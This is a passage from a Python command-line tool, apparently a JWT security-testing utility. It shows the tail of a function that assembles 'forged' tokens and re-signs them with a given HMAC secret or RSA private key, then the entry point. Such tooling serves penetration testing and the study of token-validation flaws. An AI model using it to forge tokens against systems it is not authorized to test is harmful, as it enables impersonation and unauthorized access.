        print_success(f"Signed with HMAC-{alg[2:]} secret: [yellow]{secret}[/yellow]")
        print_token("[Forged + Signed]", forged, "green")

    elif privkey_file and alg.startswith('RS'):
        try:
            from cryptography.hazmat.primitives import serialization, hashes
            from cryptography.hazmat.primitives.asymmetric import padding
            from cryptography.hazmat.backends import default_backend
            with open(privkey_file, 'rb') as f:
                privkey = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())
            sig_bytes = privkey.sign(si, padding.PKCS1v15(), hashes.SHA256())
            sig = b64url_encode(sig_bytes)
            forged = f"{h}.{p}.{sig}"
            print_success(f"Signed with RSA private key: [cyan]{privkey_file}[/cyan]")
            print_token("[Forged + RS256 Signed]", forged, "green")
        except Exception as e:
            print_fail(f"RSA signing failed: {e}")
    else:
        # No signing — just build unsigned
        forged = f"{h}.{p}.{parser.signature_b64}"
        print_warn("No --secret or --privkey provided — keeping original signature (likely invalid)")
        print_token("[Forged - Original Sig]", forged, "yellow")


def main():
    cli()


if __name__ == '__main__':
    main()
